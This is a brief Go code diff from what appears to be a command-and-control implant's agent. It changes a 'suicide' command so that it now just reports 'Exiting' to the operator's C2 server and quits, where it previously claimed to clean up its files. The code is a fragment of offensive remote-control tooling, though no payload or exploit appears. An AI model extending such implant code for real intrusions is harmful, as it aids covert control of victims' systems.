@@ -9,14 +9,13 @@ import (
 	"github.com/spf13/cobra"
 )
 
-// suicideCmdRun deletes agent files and exits.
+// suicideCmdRun terminates the agent process on operator request.
 func suicideCmdRun(cmd *cobra.Command, args []string) {
 	if len(args) != 0 {
 		c2transport.NotifyC2(cmd, "args error: %v", args)
 		return
 	}
-	// No AgentRoot to clean up anymore
-	c2transport.NotifyC2(cmd, "Cleanup successful, exiting")
+	c2transport.NotifyC2(cmd, "Exiting")
 	logging.Infof("Exiting...")
 	os.Exit(0)
 }
